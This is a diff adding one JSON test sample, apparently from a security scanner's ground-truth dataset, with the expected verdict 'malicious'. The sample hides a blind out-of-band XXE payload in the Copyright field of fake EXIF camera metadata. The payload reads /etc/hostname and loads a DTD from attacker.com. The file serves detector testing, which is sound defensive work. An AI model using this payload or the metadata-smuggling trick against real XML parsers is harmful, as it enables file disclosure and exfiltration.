@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "gt::output::out-xxe-blind-oob.txt::binary-variations::3",
+  "base_sample_id": "gt::output::out-xxe-blind-oob.txt",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -158686051,
+  "content": "{\n  \"format\": \"image\",\n  \"metadata\": {\n    \"Copyright\": \"# Marfaak AI Security - XXE blind OOB\\n\\n**WARNING: This payload tests XXE blind OOB.**\\n\\n<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n<!DOCTYPE foo [\\n  <!ENTITY % file SYSTEM \\\"file:///etc/hostname\\\">\\n  <!ENTITY % dtd SYSTEM \\\"https://attacker.com/xxe.dtd\\\">\\n  %dtd;\\n]>\\n<data>Blind XXE exfiltration via OOB channel</data>\",\n    \"Make\": \"Canon\",\n    \"Model\": \"EOS R5\",\n    \"DateTime\": \"2026:01:15 10:30:00\",\n    \"ExifVersion\": \"0232\"\n  }\n}",
+  "content_hash": "edb95ea4d61a3dba52d8b19fa5dae79b46b7e074bf5d728948714875d871844f",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:exif",
+  "difficulty": "advanced"
+}
